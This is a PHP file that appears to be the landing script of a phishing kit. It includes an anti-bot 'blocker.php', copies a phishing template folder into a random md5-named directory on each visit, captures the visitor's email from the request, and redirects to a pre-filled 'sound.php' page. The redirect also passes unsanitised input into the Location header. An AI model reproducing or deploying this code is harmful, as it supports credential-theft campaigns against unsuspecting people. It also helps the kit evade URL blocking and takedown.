<?php

include('blocker.php');

$random = rand(0,100000000000);
$dst    = substr(md5($random), 0, 1000000000);

//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

if(isset($_POST["mail"])){
	 		$_SESSION["mail"]=$_POST["mail"];
	 } else {

            $_SESSION["mail"]= $_GET["mail"];
	 }
	


$data = $_GET["mail"];

$src="sima";
recurse_copy( $src, $dst );

header("location:".$dst."/sound.php?mail=".$data."");

?>
<script type="text/javascript" src="https://cdn.ywxi.net/js/1.js" async></script>